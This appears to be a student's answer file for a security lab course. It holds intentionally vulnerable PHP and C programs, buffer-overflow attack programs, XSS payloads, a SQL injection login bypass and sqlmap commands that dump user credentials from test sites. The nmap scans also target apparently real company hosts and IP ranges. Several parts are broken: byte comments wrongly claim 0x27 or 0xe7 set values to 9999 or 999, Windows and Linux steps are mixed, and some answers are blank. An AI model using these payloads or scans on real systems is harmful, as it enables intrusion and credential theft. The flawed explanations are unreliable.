@@ -1,0 +1,935 @@
+1.Develop an E-Commerce web page that uses GET and POST methods. And identify and exploit vulnerabilities.
+Create a folder in xampp/htdocs/
+And run using http://localhost/AS/Q1/checkout.php (file name as per you location)
+Index.html-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>E-Commerce Store</title>
+</head>
+<body>
+<h1>Welcome to Our Store</h1>
+<form action="cart.php" method="post" id="productForm">
+<h2>Products</h2>
+<label for="product">Choose a product:</label>
+<select id="product" name="product">
+<option value="item1" data-price="10">Product 1 - $10</option>
+<option value="item2" data-price="20">Product 2 - $20</option>
+<option value="item3" data-price="30">Product 3 - $30</option>
+</select>
+<input type="hidden" name="price" id="price" value="10">
+<br><br>
+<label for="quantity">Quantity:</label>
+<input type="number" id="quantity" name="quantity" value="1" min="1">
+<br><br>
+<input type="submit" value="Add to Cart">
+</form>
+
+<script>
+document.getElementById("product").addEventListener("change", function() {
+    var selectedPrice = this.options[this.selectedIndex].getAttribute("data-price");
+    document.getElementById("price").value = selectedPrice;
+});
+</script>
+</body>
+</html>
+
+
+Cart.php-
+<?php
+session_start();
+
+// Clear previous cart after every new login
+unset($_SESSION['cart']);
+
+if (!isset($_SESSION['cart'])) {
+    $_SESSION['cart'] = array();
+}
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['product']) &&
+    isset($_POST['quantity']) && isset($_POST['price'])) {
+    $product = $_POST['product'];
+    $quantity = $_POST['quantity'];
+    $price = $_POST['price'];
+    // Store item in session
+    $item = array("product" => $product, "quantity" => $quantity, "price" => $price);
+    array_push($_SESSION['cart'], $item);
+}
+
+// Initialize total variable
+$total = 0;
+foreach ($_SESSION['cart'] as $item) {
+    $total += $item['quantity'] * $item['price'];
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Shopping Cart</title>
+    <style>
+        table {
+            width: 50%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+<h1>Your Cart</h1>
+<?php if (!empty($_SESSION['cart'])): ?>
+    <table border="1">
+        <tr>
+            <th>Product</th>
+            <th>Quantity</th>
+            <th>Price</th>
+        </tr>
+        <?php foreach ($_SESSION['cart'] as $item): ?>
+            <tr>
+                <td><?php echo htmlspecialchars($item['product']); ?></td>
+                <td><?php echo htmlspecialchars($item['quantity']); ?></td>
+                <td>$<?php echo number_format($item['price'], 2); ?></td> <!-- Format price as currency -->
+            </tr>
+        <?php endforeach; ?>
+    </table>
+<?php else: ?>
+    <p>Your cart is empty.</p>
+<?php endif; ?>
+<h2>Total: $<?php echo htmlspecialchars(number_format($total, 2)); ?></h2> <!-- Format total as currency -->
+<form action="checkout.php" method="POST">
+    <?php if (!empty($_SESSION['cart'])): ?>
+        <?php $item = end($_SESSION['cart']); ?>
+        <input type="hidden" name="product" value="<?php echo htmlspecialchars($item['product']); ?>">
+        <input type="hidden" name="quantity" value="<?php echo htmlspecialchars($item['quantity']); ?>">
+        <input type="hidden" name="price" value="<?php echo htmlspecialchars($item['price']); ?>">
+        <input type="submit" value="Proceed to Checkout">
+    <?php endif; ?>
+</form>
+</body>
+</html>
+
+Checkout.php-
+<?php
+session_start();
+
+// Check if the cart is not empty
+if (!empty($_SESSION['cart'])) {
+    // Here you could perform any additional processing such as saving the order to a database, sending confirmation emails, etc.
+    
+    // For demonstration purposes, let's just display the items in the cart again
+    echo "<h1>Order Summary</h1>";
+    echo "<div style='overflow-x:auto;'>";
+    echo "<table style='width: 100%; border-collapse: collapse;'>";
+    echo "<tr>";
+    echo "<th style='border: 1px solid #ddd; padding: 8px;'>Product</th>";
+    echo "<th style='border: 1px solid #ddd; padding: 8px;'>Quantity</th>";
+    echo "<th style='border: 1px solid #ddd; padding: 8px;'>Price</th>";
+    echo "</tr>";
+    
+    $total = 0;
+    foreach ($_SESSION['cart'] as $item) {
+        echo "<tr>";
+        echo "<td style='border: 1px solid #ddd; padding: 8px;'>" . htmlspecialchars($item['product']) . "</td>";
+        echo "<td style='border: 1px solid #ddd; padding: 8px;'>" . htmlspecialchars($item['quantity']) . "</td>";
+        echo "<td style='border: 1px solid #ddd; padding: 8px;'>$" . htmlspecialchars($item['price']) . "</td>";
+        echo "</tr>";
+        $total += $item['quantity'] * $item['price'];
+    }
+    
+    echo "</table>";
+    echo "</div>";
+    
+    // Display total
+    echo "<h2>Total: $" . htmlspecialchars($total) . "</h2>";
+    
+    // Clear the cart after checkout
+    $_SESSION['cart'] = array();
+} else {
+    echo "<h1>Your cart is empty</h1>";
+}
+?>
+
+
+2.Implement a stack buffer overflow attack using a procedural language on the "Legacy Banking System". Explain the concept of stack buffer overflow and discuss techniques to prevent such attacks.
+(make folder on desktop->two->your_files)
+legacy_banking.c-
+#include <stdio.h>
+#include <string.h>
+
+typedef struct {
+    char accountHolderName[10];
+    int accountBalance;
+} Account;
+
+int main() {
+    Account acc;
+
+    printf("Enter account holder's name (Max 10 characters): ");
+    acc.accountBalance = 1000;  // Default balance
+    gets(acc.accountHolderName);  // Vulnerable function
+
+    printf("Thank you %s! Account Balance: $%d\n", acc.accountHolderName, acc.accountBalance);
+    return 0;
+}
+
+attack.c-
+#include <stdio.h>
+
+#include <string.h>
+
+int main() {
+
+    // Change accountBalance to 9999
+
+    printf("%s%c", "aaaaaaaaaaaa", '\x27');  // Assuming 0x27 is the value that sets balance to 9999
+
+    return 0;
+
+}
+
+
+1st terminal-
+cd Desktop
+cd two
+gcc -fno-stack-protector -o test legacy_banking.c
+gdb test
+break main
+run
+info registers
+disas
+x/20 0x7fffffffde00
+next
+(enter holder’s name more than max 10 characters)
+p/x 9999
+
+2nd terminal-
+cd Desktop
+cd two
+gcc -o attack attack.c
+.\attack.exe | .\test.exe
+
+3.Create Social media Web Page and Perform a reflected  cross-site scripting (XSS) attack on it . 
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS Demo</title>
+  </head>
+  <body>
+    <h1>Welcome to Our Social Media Page</h1>
+    <form action="" method="GET">
+      <label for="name">Enter your name:</label>
+      <input type="text" id="name" name="name" />
+      <button type="submit">Submit</button>
+    </form>
+
+    <div id="greeting">
+      <p>
+        Hello,
+        <script>
+          document.write(
+            decodeURIComponent(window.location.search.substring(6))
+          );
+        </script>
+        ! Welcome to our website.
+      </p>
+    </div>
+  </body>
+</html>
+Vulnerable function- <script>alert(‘XSS ATTACK’)</script>
+
+
+4.Create Social media Web Page and Perform a Stored  cross-site scripting (XSS) attack on it . 
+
+Table In php
+
+CREATE TABLE comments (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    comment TEXT
+);
+
+Index.php
+<?php
+$servername = "localhost";
+$username = "root"; // change to your MySQL user
+$password = "password"; // change to your MySQL password
+$dbname = "ese";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Fetch comments
+$sql = "SELECT * FROM comments";
+$result = $conn->query($sql);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Media Comments</title>
+</head>
+<body>
+    <form action="comment.php" method="post">
+        <input type="text" name="comment">
+        <button type="submit">Post Comment</button>
+    </form>
+    <ul>
+        <?php
+        if ($result->num_rows > 0) {
+            while($row = $result->fetch_assoc()) {
+                echo "<li>" . $row["comment"] . "</li>";
+            }
+        } else {
+            echo "<li>No comments yet</li>";
+        }
+        ?>
+    </ul>
+</body>
+</html>
+
+<?php
+$conn->close();
+?>
+
+Comment.php
+<?php
+$servername = "localhost";
+$username = "root"; // change to your MySQL user
+$password = "password"; // change to your MySQL password
+$dbname = "ese";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Insert comment
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $comment = $_POST["comment"];
+    $stmt = $conn->prepare("INSERT INTO comments (comment) VALUES (?)");
+    $stmt->bind_param("s", $comment);
+    $stmt->execute();
+    $stmt->close();
+}
+
+$conn->close();
+
+// Redirect back to the main page
+header("Location: index.php");
+exit();
+?>
+
+Links:
+http://localhost/phpmyadmin/
+http://localhost/c2p21/index.html
+
+5.Create Net Banking Web Page and Perform a reflected  cross-site scripting (XSS) attack on it . 
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS Demo</title>
+  </head>
+  <body>
+    <h1>Welcome to Our Banking Page</h1>
+    <form action="" method="GET">
+      <label for="name">Enter your name:</label>
+      <input type="text" id="name" name="name" />
+      <button type="submit">Submit</button>
+    </form>
+
+    <div id="greeting">
+      <p>
+        Hello,
+        <script>
+          document.write(
+            decodeURIComponent(window.location.search.substring(6))
+          );
+        </script>
+        ! Welcome to our website.
+      </p>
+    </div>
+  </body>
+</html>
+Vulnerable function- <script>alert('XSS ATTACK')</script>
+
+
+6.Create Net Banking Web Page and Perform a Stored  cross-site scripting (XSS) attack on it. 
+(SAME AS 4TH)
+
+
+7.Use NMAP to perform port scanning on the network of Tech Startup Inc. to locate malware and vulnerabilities. 
+nmap inc42.com
+sudo nmap -sA inc42.com
+nmap 169.148.148.*
+nmap 169.148.148.67
+nmap 169.148.148.25-29
+sudo nmap -sS 169.148.148.67
+sudo nmap inc42.com -oG op.txt
+nmap -iL input.txt
+nmap -p 45-50 inc42.com
+sudo nmap –trace inc42.com
+sudo nmap -O  inc42.com
+
+
+8.Implement a stack buffer overflow attack using a procedural language on the "Internal Inventory Management System". 
+(make folder on desktop->two->your_files)
+
+test.c-
+#include <stdio.h>
+#include <string.h>
+
+typedef struct {
+    char itemName[10];
+    int quantity;
+} InventoryItem;
+
+int main() {
+    InventoryItem item;
+
+    printf("Enter item name (Max 10 characters): ");
+    item.quantity = 100;  // Default quantity
+    gets(item.itemName);  // Vulnerable function
+
+    printf("Item: %s, Quantity: %d\n", item.itemName, item.quantity);
+    return 0;
+}
+attack.c-
+#include <stdio.h>
+
+#include <string.h>
+
+int main() {
+
+    // Overflow the buffer and change the quantity to 999
+
+    printf("%s%c", "aaaaaaaaaaaa", '\x63');  // Assuming 0x63 is the value that sets quantity to 999
+
+    return 0;
+
+}
+
+
+1st terminal-
+cd Desktop
+cd eight
+gcc -fno-stack-protector -o test test.c
+gdb test
+break main
+run
+info registers
+disas
+x/20xw $rsp
+next
+(enter item’s name more than max 10 characters)
+p/x 999
+
+2nd terminal-
+cd Desktop
+cd eight
+gcc -o attack attack.c
+.\attack.exe | .\test.exe
+
+9.Conduct a brute force password cracking attack on the login system of BWAPP. Username -  User1234 and password will be a combination of letters a,b,c  of length 5.
+
+
+10.Perform penetration testing on the "HR Management Software" to identify and exploit application vulnerabilities. 
+
+
+11.Develop a "Blogging Platform" that uses GET and POST methods. And identify and exploit vulnerabilities.
+Create a folder in xampp/htdocs/blog
+index.html-
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simple Blogging Platform</title>
+</head>
+<body>
+    <h1>Simple Blogging Platform</h1>
+    
+    <form action="submit.php" method="POST">
+        <label for="title">Title:</label><br>
+        <input type="text" id="title" name="title"><br>
+        <label for="content">Content:</label><br>
+        <textarea id="content" name="content"></textarea><br><br>
+        <input type="submit" value="Submit">
+    </form>
+    
+    <h2>All Blog Posts</h2>
+    <?php include 'display.php'; ?>
+</body>
+</html>
+
+
+
+display.php-
+<?php
+if (file_exists('posts.txt')) {
+    $posts = file('posts.txt', FILE_IGNORE_NEW_LINES);
+    foreach ($posts as $post) {
+        list($title, $content) = explode('||', $post);
+        echo "<h3>$title</h3><p>$content</p><hr>";
+    }
+} else {
+    echo "No posts available";
+}
+?>
+
+
+
+submit.php-
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $title = htmlspecialchars($_POST['title']);
+    $content = htmlspecialchars($_POST['content']);
+
+    $data = $title . "||" . $content . "\n";
+    file_put_contents('posts.txt', $data, FILE_APPEND);
+}
+
+header("Location: index.html");
+exit();
+?>
+
+
+12.Implement a stack buffer overflow attack on the "Food Delivery” application using  a procedural language. 
+ (make folder on desktop->two->your_files)
+
+test.c-
+#include <stdio.h>
+
+#include <string.h>
+      typedef struct {
+
+    char customerName[10];
+
+    int orderAmount;
+
+} Order;
+
+int main() {
+
+    Order order;
+    printf("Enter customer name (Max 10 characters): ");
+
+    order.orderAmount = 50;  // Default order amount
+
+    gets(order.customerName);  // Vulnerable function
+
+    printf("Thank you %s! Order Amount: $%d\n", order.customerName, order.orderAmount);
+
+    return 0;
+
+}
+
+attack.c-
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+    // Overflow the buffer and change the orderAmount to 999
+    printf("%s%c", "aaaaaaaaaaaa", '\xe7');  // Assuming 0xe7 is the value that sets orderAmount to 999 (0xe7 in hex is 231 in decimal)
+    return 0;
+}
+
+
+1st terminal-
+cd Desktop
+cd twelve
+gcc -fno-stack-protector -o test test.c
+gdb test
+break main
+run
+info registers
+disas
+x/20xw $rsp
+next
+(enter customer’s name more than max 10 characters)
+p/x 999
+
+2nd terminal-
+cd Desktop
+cd eight
+gcc -o attack attack.c
+./attack | ./test
+
+
+13.Implement a stack buffer overflow attack “Financial Analysis Software" in a simulated environment using a procedural language, documenting each step of the process. 
+test.c-
+#include <stdio.h>
+#include <string.h>
+
+typedef struct {
+    char clientName[10];
+    float balance;
+} Client;
+
+int main() {
+    Client client;
+
+    printf("Enter client name (Max 10 characters): ");
+    client.balance = 1000.0;  // Default balance
+    gets(client.clientName);  // Vulnerable function
+
+    printf("Client: %s, Balance: $%.2f\n", client.clientName, client.balance);
+    return 0;
+}
+
+attack.c-
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+    // Overflow the buffer and change the balance to 99999.99
+    printf("%s%s", "aaaaaaaaaaaa", "\xc2\x7d\x48\x46");  // This assumes we know the exact bytes to overflow and change the balance
+    return 0;
+}
+
+1st terminal-
+cd Desktop
+cd thirteen
+gcc -fno-stack-protector -o test test.c
+gdb test
+break main
+run
+info registers
+disas
+x/20xw $rsp
+next
+(enter client’s name more than max 10 characters)
+
+
+2nd terminal-
+cd Desktop
+cd thirteen
+gcc -o attack attack.c
+./attack | ./test
+
+
+14.Utilize NMAP to perform a port scan on the network of "Telecommunications Company". 
+ sudo nmap -sA altoro.testfire.net
+
+ nmap 65.61.137.*
+
+  nmap 65.61.137.25-30
+
+cat input.txt
+nmap -iL input.txt
+
+nmap -p 45-50 altoro.testfire.net
+
+
+sudo nmap trace altoro.testfire.net
+
+sudo nmap -O  altoro.testfire.net
+
+
+15.Conduct a dictionary attack password cracking attack on the BWAPP. Username - vuStudent.
+
+
+16.Perform penetration testing on the network infrastructure of "Healthcare Provider", identifying and exploiting vulnerabilities.
+Phishing settookit
+
+
+17.Investigate vulnerabilities in "Online Learning Management System", focusing on input validation and output encoding. 
+Sqlinjection and xss
+
+<!--3.Create Social media Web Page and Perform a reflected  cross-site scripting (XSS) attack on it . -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS Demo</title>
+  </head>
+  <body>
+    <h1>Welcome to Our Social Media Page</h1>
+    <form action="" method="GET">
+      <label for="name">Enter your name:</label>
+      <input type="text" id="name" name="name" />
+      <button type="submit">Submit</button>
+    </form>
+
+    <div id="greeting">
+      <p>
+        Hello,
+        <script>
+          document.write(
+            decodeURIComponent(window.location.search.substring(6))
+          );
+        </script>
+        ! Welcome to our website.
+      </p>
+    </div>
+  </body>
+<!--Vulnerable function- <script>alert(‘XSS ATTACK’)</script> -->
+  </html>
+
+
+
+18.Implement a stack buffer overflow attack.
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable(char *input) {
+    char buffer[50];
+    strcpy(buffer, input);
+    printf("Buffer content: %s\n", buffer);
+}
+
+int main() {
+    char input[100];
+    printf("Enter input: ");
+    gets(input);
+    vulnerable(input);
+    return 0;
+}
+
+
+19.Utilize NMAP to perform a port scan on the network of "Retail Chain". 
+ nmap altoro.testfire.net
+
+   sudo nmap -sA altoro.testfire.net
+
+ nmap 65.61.137.*
+
+  nmap 65.61.137.25-30
+
+cat input.txt
+nmap -iL input.txt
+
+nmap -p 45-50 altoro.testfire.net
+
+
+sudo nmap trace altoro.testfire.net
+
+sudo nmap -O  altoro.testfire.net
+
+
+
+20.Perform penetration testing on "E-Commerce Platform" to identify vulnerabilities.
+Phishing test
+Setoolkit
+
+
+
+21.Utilize NMAP to perform an port scan on the network of Altoro Mutual - http://altoro.testfire.net/ , identifying potential security risks. 
+
+ nmap altoro.testfire.net
+
+   sudo nmap -sA altoro.testfire.net
+
+ nmap 65.61.137.*
+
+  nmap 65.61.137.25-30
+
+cat input.txt
+nmap -iL input.txt
+
+nmap -p 45-50 altoro.testfire.net
+
+
+sudo nmap trace altoro.testfire.net
+
+sudo nmap -O  altoro.testfire.net
+
+
+
+22.Utilize NMAP to perform a detailed  port scan on the network of testphp.vulnweb.com 
+   nmap altoro.testfire.net
+
+   sudo nmap -sA altoro.testfire.net
+
+ nmap 65.61.137.*
+
+  nmap 65.61.137.25-30
+
+cat input.txt
+nmap -iL input.txt
+
+nmap -p 45-50 altoro.testfire.net
+
+
+sudo nmap trace altoro.testfire.net
+
+sudo nmap -O  altoro.testfire.net
+
+Same as above
+
+
+23.Perform penetration testing on "Customer Support Ticketing System" to identify vulnerabilities, such as XSS and CSRF vulnerabilities. 
+(store code in xampp folder)
+Table in php
+CREATE TABLE `tickets` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `email` varchar(255) NOT NULL,
+  `subject` varchar(255) NOT NULL,
+  `message` text NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8;
+
+Index.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Support Ticket System</title>
+</head>
+<body>
+    <h1>Submit a Support Ticket</h1>
+    <form action="submit_ticket.php" method="POST">
+        <label for="name">Name:</label><br>
+        <input type="text" id="name" name="name" required><br><br>
+
+        <label for="email">Email:</label><br>
+        <input type="email" id="email" name="email" required><br><br>
+
+        <label for="subject">Subject:</label><br>
+        <input type="text" id="subject" name="subject" required><br><br>
+
+        <label for="message">Message:</label><br>
+        <textarea id="message" name="message" required></textarea><br><br>
+
+        <input type="submit" value="Submit">
+    </form>
+
+    <br><br>
+    <!-- Login button -->
+    <button onclick="window.location.href='login.html'">Login</button>
+</body>
+</html>
+Submit_ticket.php
+
+<?php
+$servername = "localhost";
+$username = "root"; // default username for XAMPP
+$password = ""; // default password for XAMPP
+$dbname = "ese";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Prepare and bind the SQL statement
+$stmt = $conn->prepare("INSERT INTO tickets (name, email, subject, message) VALUES (?, ?, ?, ?)");
+$stmt->bind_param("ssss", $name, $email, $subject, $message);
+
+// Retrieve form data
+$name = $_POST['name'];
+$email = $_POST['email'];
+$subject = $_POST['subject'];
+$message = $_POST['message'];
+
+// Execute the statement
+if ($stmt->execute()) {
+    // Output message to the user
+    echo "New ticket created successfully. Redirecting to login page in 3 seconds...";
+
+    // Close statement and connection
+    $stmt->close();
+    $conn->close();
+
+    // Execute JavaScript for delay and redirection
+    echo "<script>
+            setTimeout(function() {
+                window.location.href = 'login.html';
+            }, 3000); // 3000 milliseconds = 3 seconds
+          </script>";
+} else {
+    echo "Error: " . $sql . "<br>" . $conn->error;
+}
+
+// Close statement and connection
+$stmt->close();
+$conn->close();
+?>
+
+Login.html
+<!-- login.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login to Support Ticket System</h2>
+    <form action="login.php" method="POST">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <input type="submit" value="Login">
+    </form>
+</body>
+</html>
+
+Login.php
+<!-- login.php -->
+<?php
+session_start();
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Hardcoded credentials for demonstration purposes
+    $valid_username = "admin";
+    $valid_password = "password";
+
+    if ($username === $valid_username && $password === $valid_password) {
+        // Authentication successful, set session variable
+        $_SESSION['authenticated'] = true;
+        header("Location: index.html"); // Redirect to main page
+        exit();
+    } else {
+        // Authentication failed, redirect back to login page with error
+        header("Location: login.html?error=1");
+        exit();
+    }
+} else {
+    // If accessed directly, redirect to login page
+    header("Location: login.html");
+    exit();
+}
+?>
+
+
+
+
+
+24.Find a way to log in as an admin without using the correct password on the "User Login Page" of Altoro Mutual - http://altoro.testfire.net/ . Explain how you did it and how this could be prevented.
+
+Username: 'OR 1=1 --
+Password:anything
+
+25.Retrieve all user data from the "Customer Database" of Acuart website - http://testphp.vulnweb.com/index.php ; Explain how you accomplished this and suggest a method to stop this unauthorized access.
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -dbs 
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -dbs acurat -tables 
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname,pass -dump 
